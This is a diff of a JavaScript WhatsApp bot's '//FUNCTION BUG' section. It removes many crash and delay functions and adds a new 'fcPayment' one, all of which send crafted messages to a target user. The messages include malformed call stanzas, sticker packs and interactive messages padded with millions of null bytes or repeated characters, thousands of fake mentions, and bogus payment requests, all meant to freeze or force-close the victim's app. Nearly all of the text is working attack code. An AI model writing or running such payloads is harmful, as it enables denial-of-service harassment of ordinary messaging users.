@@ -221,1439 +221,165 @@ if (global.owneroff && !isCmd) {
 const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}
 
 //FUNCTION BUG
-async function LunoxCallCrash(target, isVideo = false) {
-  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
+async function fcPayment(sock, target) {
+  let x = 'OrtuluhMatik ꦾ𑇂𑆵𑆴𑆿';
+  for (let i = 0; i < 120; i++) x += x;
   
-  try {
-    const devices = (
-      await client.getUSyncDevices([target], false, false)
-    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
-
-    await client.assertSessions(devices);
-
-    const createMutex = () => {
-      const locks = new Map();
-      
-      return {
-        async mutex(key, fn) {
-          while (locks.has(key)) {
-            await locks.get(key);
-          }
-          
-          const lock = Promise.resolve().then(() => fn());
-          locks.set(key, lock);
-          
-          try {
-            const result = await lock;
-            return result;
-          } finally {
-            locks.delete(key);
-          }
-        }
-      };
-    };
-
-    const mutexManager = createMutex();
-    
-    const appendBufferMarker = (buffer) => {
-      const newBuffer = Buffer.alloc(buffer.length + 8);
-      buffer.copy(newBuffer);
-      newBuffer.fill(1, buffer.length);
-      return newBuffer;
-    };
-
-    const originalCreateParticipantNodes = client.createParticipantNodes?.bind(client);
-    const originalEncodeWAMessage = client.encodeWAMessage?.bind(client);
-
-    client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
-      if (!recipientJids.length) {
-        return {
-          nodes: [],
-          shouldIncludeDeviceIdentity: false
-        };
-      }
-
-      const processedMessage = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);
-      
-      const messagePairs = Array.isArray(processedMessage) 
-        ? processedMessage 
-        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));
-
-      const { id: meId, lid: meLid } = client.authState.creds.me;
-      const localUser = meLid ? jidDecode(meLid)?.user : null;
-      let shouldIncludeDeviceIdentity = false;
-
-      const nodes = await Promise.all(
-        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
-          const { user: targetUser } = jidDecode(jid);
-          const { user: ownUser } = jidDecode(meId);
-          const isOwnUser = targetUser === ownUser || targetUser === localUser;
-          const isSelf = jid === meId || jid === meLid;
-          
-          if (dsmMessage && isOwnUser && !isSelf) {
-            msg = dsmMessage;
-          }
-
-          const encodedBytes = appendBufferMarker(
-            originalEncodeWAMessage 
-              ? originalEncodeWAMessage(msg) 
-              : encodeWAMessage(msg)
-          );
-
-          return mutexManager.mutex(jid, async () => {
-            const { type, ciphertext } = await client.signalRepository.encryptMessage({ 
-              jid, 
-              data: encodedBytes 
-            });
-            
-            if (type === 'pkmsg') {
-              shouldIncludeDeviceIdentity = true;
-            }
-            
-            return {
-              tag: 'to',
-              attrs: { jid },
-              content: [{
-                tag: 'enc',
-                attrs: {
-                  v: '2',
-                  type,
-                  ...extraAttrs
-                },
-                content: ciphertext
-              }]
-            };
-          });
-        })
-      );
-
-      return {
-        nodes: nodes.filter(Boolean),
-        shouldIncludeDeviceIdentity
-      };
-    };
-
-    const callKey = crypto.randomBytes(32);
-    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
-    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();
-
-    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
-      await client.createParticipantNodes(devices, { 
-        conversation: "call-initiated"
-      }, { count: '0' });
-
-    const callStanza = {
-      tag: "call",
-      attrs: {
-        to: target,
-        id: client.generateMessageTag(),
-        from: client.user.id
-      },
-      content: [{
-        tag: "offer",
-        attrs: {
-          "call-id": callId,
-          "call-creator": client.user.id
-        },
-        content: [
-          {
-            tag: "audio",
-            attrs: {
-              enc: "opus",
-              rate: "16000"
-            }
-          },
-          {
-            tag: "audio",
-            attrs: {
-              enc: "opus",
-              rate: "8000"
-            }
-          },
-          ...(isVideo ? [{
-            tag: 'video',
-            attrs: {
-              enc: 'vp8',
-              dec: 'vp8',
-              orientation: '0',
-              screen_width: '1920',
-              screen_height: '1080',
-              device_orientation: '0'
-            }
-          }] : []),
-          {
-            tag: "net",
-            attrs: {
-              medium: "3"
-            }
-          },
-          {
-            tag: "capability",
-            attrs: { ver: "1" },
-            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
-          },
-          {
-            tag: "encopt",
-            attrs: { keygen: "2" }
-          },
-          {
-            tag: "destination",
-            attrs: {},
-            content: destinations
-          },
-          ...(shouldIncludeDeviceIdentity ? [{
-            tag: "device-identity",
-            attrs: {},
-            content: encodeSignedDeviceIdentity(client.authState.creds.account, true)
-          }] : [])
-        ].filter(Boolean)
-      }]
-    };
-
-    await client.sendNode(callStanza);
-
-  } catch (error) {
-    console.error('Error in callCrash:', error);
-    throw error;
-  }
-}
-
-async function LunoxForceDelete(target) {
-    const {
-        encodeSignedDeviceIdentity,
-        jidEncode,
-        jidDecode,
-        encodeWAMessage,
-        patchMessageBeforeSending,
-        encodeNewsletterMessage
-    } = require("@whiskeysockets/baileys");
-
-    const ZhTxRizzMsg = await generateWAMessageFromContent(
-        target,
-        { conversation: " " },
-        { userJid: client.user.id }
-    );
-
-    await client.relayMessage(target, ZhTxRizzMsg.message, { messageId: ZhTxRizzMsg.key.id });
-    await client.sendMessage(target, { delete: ZhTxRizzMsg.key });
-
-     let devices = (
-        await client.getUSyncDevices([target], false, false)
-    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
-
-    await client.assertSessions(devices);
-
-    let xnxx = () => {
-        let map = {};
-        return {
-            mutex(key, fn) {
-                map[key] ??= { task: Promise.resolve() };
-                map[key].task = (async prev => {
-                    try { await prev; } catch { }
-                    return fn();
-                })(map[key].task);
-                return map[key].task;
-            }
-        };
-    };
-
-    let Raza = xnxx();
-    let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-    let XMods = client.createParticipantNodes.bind(client);
-    let Cyber = client.encodeWAMessage?.bind(client);
-
-    client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
-        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
-
-        let patched = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);
-        let memeg = Array.isArray(patched)
-            ? patched
-            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
-
-        let { id: meId, lid: meLid } = client.authState.creds.me;
-        let omak = meLid ? jidDecode(meLid)?.user : null;
-        let shouldIncludeDeviceIdentity = false;
-
-        let nodes = await Promise.all(
-            memeg.map(async ({ recipientJid: jid, message: ZhTxRizzMsg }) => {
-                let { user: targetUser } = jidDecode(jid);
-                let { user: ownPnUser } = jidDecode(meId);
-                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
-                let y = jid === meId || jid === meLid;
-
-                if (dsmMessage && isOwnUser && !y) ZhTxRizzMsg = dsmMessage;
-
-                let bytes = Official(Cyber ? Cyber(ZhTxRizzMsg) : encodeWAMessage(ZhTxRizzMsg));
-
-                return Raza.mutex(jid, async () => {
-                    let { type, ciphertext } = await client.signalRepository.encryptMessage({
-                        jid,
-                        data: bytes
-                    });
-
-                    if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
-
-                    return {
-                        tag: 'to',
-                        attrs: { jid },
-                        content: [
-                            {
-                                tag: 'enc',
-                                attrs: { v: '2', type, ...extraAttrs },
-                                content: ciphertext
-                            }
-                        ]
-                    };
-                });
-            })
-        );
-
-        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
-    };
-
-    let Exo = crypto.randomBytes(32);
-    let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);
-
-    let {
-        nodes: destinations,
-        shouldIncludeDeviceIdentity
-    } = await client.createParticipantNodes(
-        devices,
-        { conversation: "y" },
-        { count: '0' }
-    );
-
-    let lemiting = {
-        tag: "call",
-        attrs: {
-            to: target,
-            id: client.generateMessageTag(),
-            from: client.user.id
-        },
-        content: [
-            {
-                tag: "offer",
-                attrs: {
-                    "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
-                    "call-creator": client.user.id
-                },
-                content: [
-                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
-                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
-                    {
-                        tag: "video",
-                        attrs: {
-                            orientation: "0",
-                            screen_width: "1920",
-                            screen_height: "1080",
-                            device_orientation: "0",
-                            enc: "vp8",
-                            dec: "vp8"
-                        }
-                    },
-                    { tag: "net", attrs: { medium: "3" } },
-                    {
-                        tag: "capability",
-                        attrs: { ver: "1" },
-                        content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
-                    },
-                    { tag: "encopt", attrs: { keygen: "2" } },
-                    { tag: "destination", attrs: {}, content: destinations },
-                    ...(shouldIncludeDeviceIdentity
-                        ? [
-                            {
-                                tag: "device-identity",
-                                attrs: {},
-                                content: encodeSignedDeviceIdentity(
-                                    client.authState.creds.account,
-                                    true
-                                )
-                            }
-                        ]
-                        : []
-                    )
-                ]
-            }
-        ]
-    };
-
-    await client.sendNode(lemiting);
-    console.log(`Lunox Attack To: ${target} By Pinzy`);
-}
-
-async function LunoxBlank(target) {
-  await client.relayMessage(
-    target,
-    {
-      stickerPackMessage: {
-        stickerPackId: "X",
-        name: "𝙇𝙪𝙣𝙤𝙭𝙋𝙧𝙞𝙢𝙚 𝘼𝙩𝙩𝙖𝙘𝙠 ☠️" + "؂ن؃؄𝘓𝘶𝘯𝘰𝘹ٽ؂ن؃".repeat(10000),
-        publisher: "𝙇𝙪𝙣𝙤𝙭𝙋𝙧𝙞𝙢𝙚 𝘼𝙩𝙩𝙖𝙘𝙠 ☠️" + "؂ن؃؄𝘓𝘶𝘯𝘰𝘹ٽ؂ن؃".repeat(10000),
-        stickers: [
-          {
-            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "woi",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "pppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "maklo",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "pp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "ppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "ppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "pppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "ppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "pppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "pppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-        ],
-        fileLength: "999999",
-        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
-        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
-        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
-        directPath:
-          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
-        contextInfo: {
-          quotedMessage: {
-                paymentInviteMessage: {
-                  serviceType: 3,
-                  expiryTimestamp: Date.now() + 1814400000
-                },
-                forwardedAiBotMessageInfo: {
-                  botName: "META AI",
-                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
-                  creatorName: "Pinzy"
-                }
-            }
-        },
-        packDescription: "𝙇𝙪𝙣𝙤𝙭 𝘼𝙩𝙩𝙖𝙘𝙠 ☠️" + "؂ن؃؄𝘓𝘶𝘯𝘰𝘹ٽ؂ن؃".repeat(10000),
-        mediaKeyTimestamp: "1741150286",
-        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
-        thumbnailDirectPath:
-          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
-        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
-        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
-        thumbnailHeight: 252,
-        thumbnailWidth: 252,
-        imageDataHash:
-          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
-        stickerPackSize: "999999999",
-        stickerPackOrigin: "1",
-      },
-    }, { participant: { jid: target } });
-}
-
-async function forcloselunoxwel(target) {
   await client.relayMessage(target, {
-    ephemeralMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: {
-            text: " ¿!LunoxPrime!¿ ",
-            format: "EXTENSIONS_1"
-          },
-          contextInfo: {
-            remoteJid: " ¡!LunoxAttack!¡ ",
-            participant: "120363424874566521@s.whatsapp.net",
-            mentionedJid: ["status@broadcast"],
-            isForwarded: true,
-            forwardingScore: 9999,
-            parentGroupJid: "0@g.us",
-            isQuestion: true,
-            isSampled: true,
-            parentGroupJid: "\u0000".repeat(100000),
-            entryPointConversionDelaySeconds: 6767676767,
-            businessMessageForwardInfo: null,
-            quotedMessage: {
-              ephemeralMessage: {
-                message: {
-                  paymentInviteMessage: {
-                    serviceType: 1,
-                    expiryTimestamp: 7205
-                  }
-                }
-              }
-            }
-          },
-          nativeFlowResponseMessage: {
-            name: "galaxy_message",
-            paramsJson: "\u0000".repeat(100000),
-            version: 1
-          }
-        }
-      }
-    }
-  }, { participant: { jid: target } })
-}
-
-async function ProductionLunox(target) {
-  const productMsg = await generateWAMessageFromContent(target, {
-    viewOnceMessage: {
-      message: {
-        productMessage: {
-          product: {
-            productImage: {
-              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQNVVr96P2W2N6c2cWRXcRus7roBnJsAsj_DdImpCHGGMkqCTkwvpAuB7rd8IzTMFsenSI8bwq5v7C4_gCAZVUNY_aO-do-JVWcmCR1E4A?ccb=9-4&oh=01_Q5Aa3AFfmMdvZTkuDpy0g_3HpiCYo-g7sxug_OZv__Pz3YX4eg&oe=694013D5&_nc_sid=e6ed6c&mms3=true",
-              mimetype: "image/jpeg",
-              fileSha256: "/9OqehnTXlXT3BjmOSACk/6PA2YDD/LPI1rxiGARzIA=",
-              fileLength: "1332709",
-              height: 9999,
-              width: 9999,
-              mediaKey: "MBrUCtMvEYCXNxw2TLsPyUfPrIOxCV5b3TprGyU7LiA=",
-              fileEncSha256: "GrCugonhvozxlTdX0uf0wfKvYTnXzeFVLb6Fw8V5eNc=",
-              directPath: "/o1/v/t24/f2/m231/AQNVVr96P2W2N6c2cWRXcRus7roBnJsAsj_DdImpCHGGMkqCTkwvpAuB7rd8IzTMFsenSI8bwq5v7C4_gCAZVUNY_aO-do-JVWcmCR1E4A?ccb=9-4&oh=01_Q5Aa3AFfmMdvZTkuDpy0g_3HpiCYo-g7sxug_OZv__Pz3YX4eg&oe=694013D5&_nc_sid=e6ed6c",
-              mediaKeyTimestamp: "1763027544",
-              jpegThumbnail: null,
-              scanLengths: [4841, 5561, 3792, 10277],
-              midQualityFileSha256: "HWw9tUG2Ua+mMyq4OIl9Qm5NU0+8Nb/Ro2Ir2jGjfYQ="
-            },
-            productId: "25083871484575184",
-            title: "MAU BELI PRODUCTIONS SAYA TIDAK?",
-            currencyCode: "IDR",
-            priceAmount1000: "5310000000000",
-            productImageCount: 1,
-            salePriceAmount1000: "1000000000"
-          },
-        }
-      }
+    sendPaymentRequest: {}
+  }, {});
+  
+  await client.relayMessage(target, {
+    paymentResponseMessage: {
+      amount1000: -1,
+      currency: 'x',
+      transactionId: x,
+      status: 999
     }
   }, {});
   
-  await client.relayMessage(target, productMsg.message, {
-    messageId: productMsg.key.id,
-    participant: { jid: target },
-  });
-}
-
-async function LunoxInvis(target) {
-  await client.relayMessage(
-    target,
-    {
-      albumMessage: {
-        contextInfo: {
-          mentionedJid: Array.from(
-            { length: 2000 },
-            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-          ),
-          remoteJid: " ¡!LunoxPrime!¡ ",
-          parentGroupJid: "0@g.us",
-          isQuestion: true,
-          isSampled: true,
-          parentGroupJid: "\u0000",
-          entryPointConversionDelaySeconds: 6767676767,
-          businessMessageForwardInfo: null,
-          botMessageSharingInfo: {
-            botEntryPointOrigin: {
-              origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED"
-            },
-            forwardScore: 999
-          },
-          quotedMessage: {
-            viewOnceMessage: {
-              message: {
-                interactiveResponseMessage: {
-                  body: {
-                    text: "@pinzy • #fvcker 🩸",
-                    format: "EXTENSIONS_1",
-                  },
-                  nativeFlowResponseMessage: {
-                    name: "call_permission_request",
-                    paramsJson: "\u0000".repeat(1000000),
-                    version: 1,
-                  },
-                },
-              },
-            },
-          },
-        },
-      },
-    },
-    {
-      participant: { jid: target },
+  await client.relayMessage(target, {
+    requestPaymentMessage: {
+      currency: 'x',
+      amount1000: 999999,
+      requestFrom: target,
+      noteMessage: { conversation: x }
     }
-  );
-}
-
-async function LunoxDelayX(target, ptcp = true) {
-  const msg = generateWAMessageFromContent(target, {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          body: {
-            text: "Assalamualaikum Bang!"
-          },
-          contextInfo: {
-            remoteJid: "status@broadcast",
-            forwardingScore: 9999,
-            participant: target,
-            isForwarded: true,
-            mentionedJid: [
-              "13135550002@s.whatsapp.net",
-              ...Array.from({ length: 2000 }, () => 1 + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
-                )
-              ],
-              entryPointConversionSource: "call_permission_request"
-            }
-          }
-        }
-      }
-    },
-    {
-    ephemeralExpiration: 0,
-      forwardingScore: 9681,
-      isForwarded: true,
-      font: Math.floor(Math.random() * 500000),
-      background: "#" + Math.floor(Math.random() * 17779012).toString(16).padStart(6, "500000")
-    },
-  );
+  }, {});
   
   await client.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: msg.message,
-      },
-    }, ptcp ? 
-    { 
-      messageId: msg.key.id, 
-      participant: { jid: target } 
-    } : { messageId: msg.key.id }
-  );
-}
-
-async function LunoxXdelay2(target, mention = true) {
-  try {
-    console.log(`⏳ The Lunox Attack ke ${target}`);
-    
-    const Secret = generateWAMessageFromContent(target, {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            header: {
-              title: "\u0000".repeat(50000000),
-              hasMediaAttachment: false
-            },
-            body: {
-              text: "⏳ Lunox Imcoming" + "\u0000".repeat(50000000)
-            },
-            nativeFlowResponseMessage: {
-              name: "galaxy_message",
-              paramsJson: `{"flow_cta":"${"\u0000".repeat(50000000)}"}`,
-              version: 3                    
-            },
-            contextInfo: {
-              forwardingScore: 999999,
-              isForwarded: true,
-              stanzaId: "\u0000".repeat(50000),
-              participant: target,
-              remoteJid: "status@broadcast",
-              mentionedJid: [
-                "0@s.whatsapp.net",
-                ...Array.from({ length: 2500 }, () => 
-                  Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
-                )
-              ],
-              quotedMessage: {
-                liveLocationMessage: {
-                  degreesLatitude: 23045678087,
-                  degreesLongitude: 23045678087,
-                  caption: "\u0000".repeat(50000000),
-                  accuracyInMeters: 9999999999,
-                  speedInMps: 9999999999
-                }
-              }
-            }
-          }
-        }
-      }
-    }, { userJid: client.user.id });
-    
-    await client.relayMessage(target, Secret.message, {
-      messageId: Secret.key.id,
-      participant: { jid: target }
-    });
-    
-    await new Promise(r => setTimeout(r, 5000));
-    
-    console.log(`✅ The Lunox Sukses Attack Sent To: ${target}`);
-    
-  } catch (err) {
-    console.error(`❌ Error: ${err.message}`);
-  }
-}
-
-async function DelayLunox(target) {
-  await client.relayMessage(target, {
-    botInvokeMessage: {
-      message: {
-        listResponseMessage: {
-          title: " ? Lunox ¿ | t.me/Pinnxyz ",
-          description: " collab with devorsels, Lunox, Pinzy ¡! ",
-          listType: 1,
-          singleSelectReply: {
-            selectedRowId: "\"f*ck bastard\""
-          },
-          contextInfo: {
-            forwardingScore: 999,
-            isForwarded: true,
-            fromMe: false,
-            remoteJid: " dnd ",
-            participant: "ddd",
-            urlTrackingMap: Array.from({ length: 209000 }, (_, z) => ({
-              participant: `62${z + 720599}@s.whatsapp.net`,
-              type: 1,
-            })),
-            
-          }
-        }
-      }
+    paymentInviteMessage: {
+      serviceType: 99,
+      expiryTimestamp: 999999
     }
-  }, { participant: { jid: target }, userJid: null })
-}
-
-async function PinzyLunoxUI(target) {
-console.log(chalk.red(`𝗟𝘂𝗻𝗼𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
-    let peler = await client.relayMessage(
-      target,
-      {
-        extendedTextMessage: {
-          text: "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "ꦾ".repeat(50000),
-          matchedText: "ꦽ".repeat(20000),
-          description: "⸙ʟᴜɴᴏx нοω αяє γου?¿",
-          title: "ꦽ".repeat(20000),
-          previewType: "NONE",
-          jpegThumbnail:
-            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
-          inviteLinkGroupTypeV2: "DEFAULT",
-          contextInfo: {
-            isForwarded: true,
-            forwardingScore: 9999,
-            participant: target,
-            remoteJid: "status@broadcast",
-            mentionedJid: [
-              "0@s.whatsapp.net",
-              ...Array.from(
-                { length: 1995 },
-                () =>
-                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-              )
-            ],
-            quotedMessage: {
-              newsletterAdminInviteMessage: {
-                newsletterJid: "pinzy@newsletter",
-                newsletterName:
-                  "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "ꦾ".repeat(10000),
-                caption:
-                  "⸙ʟᴜɴᴏx нοω αяє γου?¿" +
-                  "ꦾ".repeat(60000) +
-                  "ោ៝".repeat(60000),
-                inviteExpiration: "999999999"
-              }
-            },
-            forwardedNewsletterMessageInfo: {
-              newsletterName:
-                "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
-              newsletterJid: "120363424874566521@newsletter",
-              serverId: 1
-            }
-          }
-        }
-      },
-      { participant: { jid: target } }
-    );
-    await sleep(1000);
-    await client.sendMessage(target, {
-      delete: {
-        fromMe: true,
-        remoteJid: target,
-        id: peler
-      }
-    });
-}
-
-async function PinzyLunoxAhAh(target) {
-    console.log(chalk.red('𝗟𝘂𝗻𝗼𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴'));
-
-    const { nodes, shouldIncludeDevicelentity } = await client.emit('getNodes');
-
-    const message = {
-        extendedTextMessage: {
-            text: "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust LUNOX" + "\0".repeat(100),
-            matchedText: "https://t.me/Pinnxyz",
-            description: "⸙ʟᴜɴᴏx нοω αяє γου?¿",
-            title: "ꦽ".repeat(20000),
-            previewType: 6,
-            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCAwYBBQEBAAAAAAAAAAAAAAAAAAAAA//aAAwDAQACEQMQAA+q6BooLAAFIkkgAJIsAAJEsAAJYACWC//9oACAEBAAEFAu7Z25Z9LiY3XbLs+d2s3R8/tYm7m0y7bLlyz25dV1ZYsuXKXLly9y5cuXL3Lly5cuXL3Lly5cuXL3Lly5f/EABYRAAMAAAAAAAAAAAAAAAAAAAEQYf/aAAgBAgEBPwFQz//EABYRAAMAAAAAAAAAAAAAAAAAAAEQUf/aAAgBAwEBPwEUz//Z",
-            paymentLinkMetadata: {
-                button: { displayText: "LunoxPrime - Bugs" },
-                header: { headerType: 1 },
-                provider: { paramsJson: "{".repeat(10000) }
-            },
-            contextInfo: {
-                isForwarded: true,
-                forwardingScore: 9999,
-                participant: target,
-                remoteJid: "status@broadcast",
-                mentionedJid: [
-                    "0@s.whatsapp.net",
-                    ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
-                ],
-                quotedMessage: {
-                    newsletterAdminInviteMessage: {
-                        newsletterJid: "pinzy@newsletter",
-                        newsletterName: "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "ꦾ".repeat(10000),
-                        caption: "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
-                        inviteExpiration: "999999999"
-                    }
-                },
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
-                    newsletterJid: "120363424874566521@newsletter",
-                    serverId: 1
-                }
-            }
-        }
-    };
-
-    const fullMsgNode = await client.generateWAMessage(target, message, {
-        userJid: client.user.id
-    });
-
-    const encNode = fullMsgNode.content[0];
-
-    const Stanza = {
-    tag: "message",
-    id: client.generateMessageID(),
-    type: "text",
-    to: target,
-    additionalAttributes: {},
-    content: [
-      {
-        tag: "enc",
-        attrs: {
-          v: "2",
-          type: "none"
-        },
-        content: []
-      },
-      {
-        tag: "participants",
-        atts: {},
-        content: nodes
-      }
-    ]
-  }
-
-    await client.sendNode(Stanza);
-
-    await sleep(1000);
-
-    await client.sendMessage(target, {
-        delete: {
-            remoteJid: target,
-            fromMe: true,
-            id: fullMsgNode.attrs.id,
-            participant: target
-        }
-    });
-
-    console.log(chalk.bold.red("Delay Visib Success To " + target));
-}
-
-async function PinzyDelayAngeXnxx(client, target, mention) {
-
-  let biji2 = await generateWAMessageFromContent(
-    target,
-    {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            body: { text: " ¡!LunoxPrime!¡ ", format: "DEFAULT" },
-            nativeFlowResponseMessage: {
-              name: "call_permission_request",
-              paramsJson: "\x10".repeat(1045000),
-              version: 3,
-            },
-            entryPointConversionSource: "galaxy_message",
-          },
-        },
-      },
-    },
-    {
-      ephemeralExpiration: 0,
-      forwardingScore: 9741,
-      isForwarded: true,
